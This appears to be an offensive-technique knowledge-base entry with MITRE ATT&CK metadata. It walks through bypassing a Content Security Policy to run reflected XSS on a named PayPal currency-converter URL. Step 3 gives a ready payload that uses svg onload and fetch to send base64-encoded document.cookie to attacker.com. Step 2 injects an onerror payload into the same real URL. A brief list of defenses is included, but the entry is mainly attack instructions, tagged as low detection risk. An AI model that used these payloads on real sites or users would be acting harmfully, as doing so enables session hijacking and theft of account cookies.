---
id: proc-csp-bypass-paypal
tags:
  - csp-bypass
  - xss
  - defense-evasion
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.659Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass CSP for XSS Payload Execution

## Summary

This procedure demonstrates bypassing a misconfigured Content Security Policy (CSP) on the PayPal currency converter page to enable execution of an injected reflected XSS payload, allowing malicious JavaScript to run despite protective headers.

## Description

The target endpoint implements CSP headers to restrict script sources, but weaknesses like allowing 'unsafe-inline' or exploitable JSONP endpoints permit bypass. After injecting an XSS payload via a URL parameter, the attacker modifies it to leverage CSP gaps, such as using event handlers (e.g., onerror) or base64-encoded scripts. This enables JavaScript execution for actions like cookie theft, bypassing the policy that would otherwise block the payload. The attack assumes the initial XSS reflection is possible and focuses on evasion.

## Requirements

1. Successful reflected XSS injection from prior step.
2. Access to browser developer tools to inspect CSP headers.
3. Understanding of CSP directives (e.g., script-src, default-src).
4. Attacker-controlled server for payload testing and exfiltration.

## Defense

Defensive measures and detection strategies:

- Configure CSP with nonce or hash-based script allowances, avoiding 'unsafe-inline'.
- Regularly audit CSP headers for bypass vectors like eval() or JSONP.
- Use browser security features like strict CSP enforcement.
- Log and alert on CSP violation attempts in server logs.

## Objectives

1. Analyze and identify CSP weaknesses.
2. Modify XSS payload to evade policy restrictions.
3. Achieve JavaScript execution for malicious purposes.

## Instructions

### Step 1: Inspect CSP Header

**Context**: Review the security headers to find bypass opportunities.

Load the vulnerable page in a browser, open DevTools (Network tab), reload, and select the request. Look for 'Content-Security-Policy' header and note allowed sources.

> Example CSP: default-src 'self'; script-src 'unsafe-inline' – this allows inline script bypass.

### Step 2: Test Standard Bypass Techniques

**Context**: Experiment with payloads that exploit common CSP flaws.

If 'unsafe-inline' is allowed, use direct <script> tags. Otherwise, try event-based: https://www.paypal.com/businesswallet/currencyConverter/?amount=<img src=x onerror=alert('Bypass')>. Check console for execution.

> Expected output: Alert triggers without CSP error.

### Step 3: Implement Advanced Exfiltration

**Context**: Craft a payload that evades CSP and steals data.

Use: https://www.paypal.com/businesswallet/currencyConverter/?amount=<svg onload=fetch('https://attacker.com/?c='+btoa(document.cookie))>. Verify via network tab that the request succeeds.

> Expected output: Base64-encoded cookie data sent to attacker, no console blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csp-bypass]]
- [[xss]]
- [[defense-evasion]]
